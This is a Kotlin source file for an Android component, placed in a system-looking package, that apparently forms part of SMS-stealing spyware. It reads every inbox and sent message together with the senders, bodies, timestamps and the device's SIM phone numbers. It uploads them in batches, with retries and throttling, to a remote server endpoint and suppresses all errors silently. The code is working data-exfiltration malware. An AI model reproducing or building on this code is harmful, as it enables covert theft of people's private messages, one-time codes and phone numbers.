package com.android.system.services.utils

import android.content.Context
import android.os.Build
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.security.MessageDigest

object SmsBatchUploader {

    private const val BATCH_SIZE = 200
    private const val FETCH_CHUNK_SIZE = 2000
    private const val MAX_SAFE_SMS_COUNT = 100000
    private const val RETRY_ATTEMPTS = 3
    private const val DELAY_BETWEEN_BATCHES_MS = 300L
    private const val DELAY_BETWEEN_CHUNKS_MS = 1000L
    private const val PROCESSING_DELAY_MS = 50L
    private const val CHUNK_SIZE = 500

    private var isCancelled = false
    private var isUploading = false

    suspend fun uploadQuickSms(
        context: Context,
        deviceId: String,
        baseUrl: String,
        limit: Int = 50
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val inboxMessages = fetchSmsFromBox(
                context = context,
                deviceId = deviceId,
                box = Telephony.Sms.Inbox.CONTENT_URI,
                type = "inbox",
                limit = limit / 2
            )

            val sentMessages = fetchSmsFromBox(
                context = context,
                deviceId = deviceId,
                box = Telephony.Sms.Sent.CONTENT_URI,
                type = "sent",
                limit = limit / 2
            )

            val allMessages = inboxMessages + sentMessages

            if (allMessages.isEmpty()) {
                return@withContext UploadResult.Success(0, 0, 0)
            }

            val success = sendBatch(
                messages = allMessages,
                deviceId = deviceId,
                baseUrl = baseUrl,
                batchInfo = BatchInfo(1, 1, allMessages.size, allMessages.size, allMessages.size)
            )

            if (success) {
                UploadResult.Success(allMessages.size, 0, 0)
            } else {
                UploadResult.Failure("Quick upload failed")
            }

        } catch (e: Exception) {
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    suspend fun uploadAllSms(
        context: Context,
        deviceId: String,
        baseUrl: String,
        onProgress: ((UploadProgress) -> Unit)? = null
    ): UploadResult = withContext(Dispatchers.IO) {

        if (isUploading) {
            return@withContext UploadResult.Failure("Upload already in progress")
        }

        isUploading = true
        isCancelled = false

        try {
            onProgress?.invoke(UploadProgress.Counting("Counting messages..."))
            val totalCount = countTotalSms(context)

            if (totalCount == 0) {
                return@withContext UploadResult.Success(0, 0, 0)
            }

            val safeCount = minOf(totalCount, MAX_SAFE_SMS_COUNT)

            onProgress?.invoke(UploadProgress.Processing(safeCount, 0, "Starting upload..."))

            val result = processAllMessages(
                context = context,
                deviceId = deviceId,
                baseUrl = baseUrl,
                maxCount = safeCount,
                onProgress = onProgress
            )

            when (result) {
                is UploadResult.Success -> {
                    onProgress?.invoke(UploadProgress.Completed(safeCount, "Upload completed"))
                }
                is UploadResult.Failure -> {}
            }

            result

        } catch (e: Exception) {
            onProgress?.invoke(UploadProgress.Failed("Upload failed: ${e.message}"))
            UploadResult.Failure(e.message ?: "Unknown error")

        } finally {
            isUploading = false
        }
    }

    private suspend fun processAllMessages(
        context: Context,
        deviceId: String,
        baseUrl: String,
        maxCount: Int,
        onProgress: ((UploadProgress) -> Unit)?
    ): UploadResult = withContext(Dispatchers.IO) {

        var totalSent = 0
        var totalSkipped = 0
        var totalFailed = 0

        var inboxOffset = 0
        var hasMoreInbox = true

        while (hasMoreInbox && !isCancelled && inboxOffset < maxCount) {
            val remainingCount = maxCount - inboxOffset
            val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)

            val inboxChunk = fetchSmsChunk(
                context = context,
                deviceId = deviceId,
                box = Telephony.Sms.Inbox.CONTENT_URI,
                type = "inbox",
                offset = inboxOffset,
                limit = fetchCount
            )

            if (inboxChunk.isEmpty()) {
                hasMoreInbox = false
                break
            }

            val chunkResult = processChunk(
                messages = inboxChunk,
                deviceId = deviceId,
                baseUrl = baseUrl,
                startIndex = inboxOffset,
                totalCount = maxCount,
                onProgress = onProgress
            )

            totalSent += chunkResult.sent
            totalSkipped += chunkResult.skipped
            totalFailed += chunkResult.failed

            inboxOffset += inboxChunk.size

            if (hasMoreInbox && !isCancelled) {
                delay(DELAY_BETWEEN_CHUNKS_MS)
            }
        }

        if (!isCancelled && inboxOffset < maxCount) {
            var sentOffset = 0
            var hasMoreSent = true
            val remainingSlots = maxCount - inboxOffset

            while (hasMoreSent && !isCancelled && sentOffset < remainingSlots) {
                val remainingCount = remainingSlots - sentOffset
                val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)

                val sentChunk = fetchSmsChunk(
                    context = context,
                    deviceId = deviceId,
                    box = Telephony.Sms.Sent.CONTENT_URI,
                    type = "sent",
                    offset = sentOffset,
                    limit = fetchCount
                )

                if (sentChunk.isEmpty()) {
                    hasMoreSent = false
                    break
                }

                val chunkResult = processChunk(
                    messages = sentChunk,
                    deviceId = deviceId,
                    baseUrl = baseUrl,
                    startIndex = inboxOffset + sentOffset,
                    totalCount = maxCount,
                    onProgress = onProgress
                )

                totalSent += chunkResult.sent
                totalSkipped += chunkResult.skipped
                totalFailed += chunkResult.failed

                sentOffset += sentChunk.size

                if (hasMoreSent && !isCancelled) {
                    delay(DELAY_BETWEEN_CHUNKS_MS)
                }
            }
        }

        UploadResult.Success(totalSent, totalSkipped, totalFailed)
    }

    private suspend fun processChunk(
        messages: List<SmsModel>,
        deviceId: String,
        baseUrl: String,
        startIndex: Int,
        totalCount: Int,
        onProgress: ((UploadProgress) -> Unit)?
    ): ChunkResult = withContext(Dispatchers.IO) {

        var sent = 0
        var skipped = 0
        var failed = 0

        val totalBatches = (messages.size + BATCH_SIZE - 1) / BATCH_SIZE

        for (batchIndex in 0 until totalBatches) {
            if (isCancelled) break

            val start = batchIndex * BATCH_SIZE
            val end = minOf(start + BATCH_SIZE, messages.size)
            val batch = messages.subList(start, end)

            val batchInfo = BatchInfo(
                batchNumber = batchIndex + 1,
                totalBatches = totalBatches,
                batchSize = batch.size,
                totalMessages = totalCount,
                currentProgress = startIndex + end
            )

            var success = false
            var attempts = 0

            while (!success && attempts < RETRY_ATTEMPTS && !isCancelled) {
                attempts++

                try {
                    success = withTimeout(10000L) {
                        sendBatch(batch, deviceId, baseUrl, batchInfo)
                    }

                    if (!success && attempts < RETRY_ATTEMPTS) {
                        delay(500L * attempts)
                    }

                } catch (e: Exception) {
                    if (attempts < RETRY_ATTEMPTS) {
                        delay(500L * attempts)
                    }
                }
            }

            if (success) {
                sent += batch.size
            } else {
                failed += batch.size
            }

            val progress = ((batchInfo.currentProgress.toFloat() / totalCount) * 100).toInt()
            onProgress?.invoke(
                UploadProgress.Processing(
                    totalCount,
                    batchInfo.currentProgress,
                    "Uploading: $progress%"
                )
            )

            if (batchIndex < totalBatches - 1 && !isCancelled) {
                delay(DELAY_BETWEEN_BATCHES_MS)
            }

            if (batchIndex % 10 == 0) {
                delay(100)
            }
        }

        ChunkResult(sent, skipped, failed)
    }

    private suspend fun sendBatch(
        messages: List<SmsModel>,
        deviceId: String,
        baseUrl: String,
        batchInfo: BatchInfo
    ): Boolean = withContext(Dispatchers.IO) {
        try {
            val messagesArray = JSONArray()
            val currentTime = System.currentTimeMillis()

            messages.forEach { sms ->
                messagesArray.put(JSONObject().apply {
                    put("sms_id", sms.smsId)
                    put("device_id", deviceId)
                    put("from", sms.from)
                    put("to", sms.to)
                    put("body", sms.body)
                    put("timestamp", sms.timestamp)
                    put("type", sms.type)
                    put("is_read", sms.isRead)
                    put("received_at", currentTime)
                    if (sms.simPhoneNumber.isNotEmpty()) {
                        put("sim_phone_number", sms.simPhoneNumber)
                    }
                    if (sms.simSlot >= 0) {
                        put("sim_slot", sms.simSlot)
                    }
                })
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", messagesArray)
                put("batch_info", JSONObject().apply {
                    put("batch", batchInfo.batchNumber)
                    put("of", batchInfo.totalBatches)
                })
            }

            val response = sendPostRequest("$baseUrl/sms/batch", json.toString())
            response != null

        } catch (e: Exception) {
            false
        }
    }

    private fun fetchSmsFromBox(
        context: Context,
        deviceId: String,
        box: android.net.Uri,
        type: String,
        limit: Int
    ): List<SmsModel> {
        val messages = mutableListOf<SmsModel>()

        try {
            val columns = mutableListOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.READ
            )
            
            val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val possibleColumns = listOf("sub_id", "subscription_id", "sim_id", "phone_id")
                val foundColumns = mutableListOf<String>()
                
                try {
                    val testCursor = context.contentResolver.query(box, null, null, null, null)
                    testCursor?.use {
                        val availableColumns = it.columnNames.toSet()
                        for (col in possibleColumns) {
                            if (col in availableColumns) {
                                foundColumns.add(col)
                            }
                        }
                    }
                } catch (e: Exception) {
                }
                
                foundColumns.forEach { columns.add(it) }
                foundColumns.firstOrNull()
            } else null
            
            val cursor = context.contentResolver.query(
                box,
                columns.toTypedArray(),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit"
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val subIdIndex = if (subIdColumn != null) {
                    try {
                        var idx = it.getColumnIndex(subIdColumn)
                        if (idx < 0) {
                            idx = it.getColumnIndex("subscription_id")
                        }
                        if (idx < 0) {
                            idx = it.getColumnIndex("sim_id")
                        }
                        if (idx < 0) {
                            idx = it.getColumnIndex("phone_id")
                        }
                        if (idx >= 0) idx else -1
                    } catch (e: Exception) {
                        -1
                    }
                } else -1

                while (it.moveToNext()) {
                    try {
                        val id = it.getLong(idIndex)
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val date = it.getLong(dateIndex)
                        val isRead = it.getInt(readIndex) == 1
                        
                        var subId: Int? = null
                        if (subIdIndex >= 0) {
                            try {
                                val subIdValue = it.getString(subIdIndex)
                                if (!subIdValue.isNullOrBlank()) {
                                    subId = subIdValue.toIntOrNull()
                                }
                            } catch (e: Exception) {
                            }
                        }
                        
                        val (simPhoneNumber, simSlot) = if (subId != null && subId >= 0) {
                            getSimInfoFromSubId(context, subId)
                        } else {
                            Pair("", -1)
                        }

                        if (!address.isNullOrBlank() && body != null) {
                            val (from, to) = if (type == "inbox") {
                                address.trim() to ""
                            } else {
                                val fromNumber = if (simPhoneNumber.isNotEmpty()) {
                                    simPhoneNumber
                                } else {
                                    ""
                                }
                                fromNumber to address.trim()
                            }

                            // Generate sms_id using same method as backend (MD5 hash)
                            // This prevents duplicates when SMS comes from both real-time and batch
                            val smsIdString = "${deviceId}:${from}:${to}:${date}:${body}"
                            val md = MessageDigest.getInstance("MD5")
                            val hashBytes = md.digest(smsIdString.toByteArray())
                            val smsId = hashBytes.joinToString("") { "%02x".format(it) }

                            messages.add(
                                SmsModel(
                                    smsId = smsId,
                                    deviceId = deviceId,
                                    from = from,
                                    to = to,
                                    body = body,
                                    timestamp = date,
                                    type = type,
                                    isRead = isRead,
                                    simPhoneNumber = simPhoneNumber,
                                    simSlot = simSlot
                                )
                            )
                        }
                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
        }

        return messages
    }

    private fun fetchSmsChunk(
        context: Context,
        deviceId: String,
        box: android.net.Uri,
        type: String,
        offset: Int,
        limit: Int
    ): List<SmsModel> {
        val messages = mutableListOf<SmsModel>()

        try {
            val columns = mutableListOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.READ
            )
            
            val subIdColumn = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val possibleColumns = listOf("sub_id", "subscription_id", "sim_id", "phone_id")
                val foundColumns = mutableListOf<String>()
                
                try {
                    val testCursor = context.contentResolver.query(box, null, null, null, null)
                    testCursor?.use {
                        val availableColumns = it.columnNames.toSet()
                        for (col in possibleColumns) {
                            if (col in availableColumns) {
                                foundColumns.add(col)
                            }
                        }
                    }
                } catch (e: Exception) {
                }
                
                foundColumns.forEach { columns.add(it) }
                foundColumns.firstOrNull()
            } else null
            
            val cursor = context.contentResolver.query(
                box,
                columns.toTypedArray(),
                null,
                null,
                "${Telephony.Sms.DATE} DESC LIMIT $limit OFFSET $offset"
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
                val subIdIndex = if (subIdColumn != null) {
                    try {
                        var idx = it.getColumnIndex(subIdColumn)
                        if (idx < 0) {
                            idx = it.getColumnIndex("subscription_id")
                        }
                        if (idx < 0) {
                            idx = it.getColumnIndex("sim_id")
                        }
                        if (idx < 0) {
                            idx = it.getColumnIndex("phone_id")
                        }
                        if (idx >= 0) idx else -1
                    } catch (e: Exception) {
                        -1
                    }
                } else -1

                var processed = 0

                while (it.moveToNext()) {
                    try {
                        val id = it.getLong(idIndex)
                        val address = it.getString(addressIndex)
                        val body = it.getString(bodyIndex)
                        val date = it.getLong(dateIndex)
                        val isRead = it.getInt(readIndex) == 1
                        
                        var subId: Int? = null
                        if (subIdIndex >= 0) {
                            try {
                                val subIdValue = it.getString(subIdIndex)
                                if (!subIdValue.isNullOrBlank()) {
                                    subId = subIdValue.toIntOrNull()
                                }
                            } catch (e: Exception) {
                            }
                        }
                        
                        val (simPhoneNumber, simSlot) = if (subId != null && subId >= 0) {
                            getSimInfoFromSubId(context, subId)
                        } else {
                            Pair("", -1)
                        }

                        if (address.isNullOrBlank() || body == null) continue

                        val (from, to) = if (type == "inbox") {
                            address.trim() to ""
                        } else {
                            val fromNumber = if (simPhoneNumber.isNotEmpty()) {
                                simPhoneNumber
                            } else {
                                ""
                            }
                            fromNumber to address.trim()
                        }

                        // Generate sms_id using same method as backend (MD5 hash)
                        // This prevents duplicates when SMS comes from both real-time and batch
                        val smsIdString = "${deviceId}:${from}:${to}:${date}:${body}"
                        val md = MessageDigest.getInstance("MD5")
                        val hashBytes = md.digest(smsIdString.toByteArray())
                        val smsId = hashBytes.joinToString("") { "%02x".format(it) }

                        messages.add(
                            SmsModel(
                                smsId = smsId,
                                deviceId = deviceId,
                                from = from,
                                to = to,
                                body = body,
                                timestamp = date,
                                type = type,
                                isRead = isRead,
                                simPhoneNumber = simPhoneNumber,
                                simSlot = simSlot
                            )
                        )
                        processed++

                        if (processed % CHUNK_SIZE == 0) {
                            Thread.sleep(PROCESSING_DELAY_MS)
                        }

                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
        }

        return messages
    }

    private fun countTotalSms(context: Context): Int {
        return try {
            var inboxCount = 0
            var sentCount = 0

            context.contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf("COUNT(*)"),
                null, null, null
            )?.use {
                if (it.moveToFirst()) inboxCount = it.getInt(0)
            }

            context.contentResolver.query(
                Telephony.Sms.Sent.CONTENT_URI,
                arrayOf("COUNT(*)"),
                null, null, null
            )?.use {
                if (it.moveToFirst()) sentCount = it.getInt(0)
            }

            inboxCount + sentCount

        } catch (e: Exception) {
            0
        }
    }

    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            null
        } finally {
            connection?.disconnect()
        }
    }

    fun cancelUpload() {
        isCancelled = true
    }

    data class SmsModel(
        val smsId: String,
        val deviceId: String,
        val from: String,
        val to: String,
        val body: String,
        val timestamp: Long,
        val type: String,
        val isRead: Boolean,
        val simPhoneNumber: String = "",
        val simSlot: Int = -1
    )
    
    private fun getSimInfoFromSubId(context: Context, subId: Int?): Pair<String, Int> {
        if (subId == null || subId < 0) return Pair("", -1)
        
        try {
            val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            if (subManager == null) return Pair("", -1)
            
            val activeSubscriptions = subManager.activeSubscriptionInfoList
            if (activeSubscriptions.isNullOrEmpty()) return Pair("", -1)
            
            val subscriptionInfo = activeSubscriptions.find { it.subscriptionId == subId }
            if (subscriptionInfo == null) return Pair("", -1)
            
            val simSlot = subscriptionInfo.simSlotIndex
            var phoneNumber = subscriptionInfo.number ?: ""
            
            if (phoneNumber.isBlank() && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    if (telephonyManager != null) {
                        val tm = telephonyManager.createForSubscriptionId(subId)
                        phoneNumber = tm.line1Number ?: ""
                    }
                } catch (e: Exception) {
                    Log.w("SmsBatchUploader", "Failed to get line1Number for subId $subId: ${e.message}")
                }
            }
            
            return Pair(phoneNumber, simSlot)
        } catch (e: Exception) {
            Log.e("SmsBatchUploader", "Error getting SIM info: ${e.message}")
            return Pair("", -1)
        }
    }
    

    data class BatchInfo(
        val batchNumber: Int,
        val totalBatches: Int,
        val batchSize: Int,
        val totalMessages: Int,
        val currentProgress: Int
    )

    data class ChunkResult(
        val sent: Int,
        val skipped: Int,
        val failed: Int
    )

    sealed class UploadResult {
        data class Success(
            val totalSent: Int,
            val totalSkipped: Int,
            val totalFailed: Int
        ) : UploadResult()

        data class Failure(val error: String) : UploadResult()
    }

    sealed class UploadProgress {
        data class Counting(val message: String) : UploadProgress()
        data class Processing(
            val total: Int,
            val processed: Int,
            val message: String
        ) : UploadProgress()
        data class Completed(val total: Int, val message: String) : UploadProgress()
        data class Failed(val message: String) : UploadProgress()
    }
}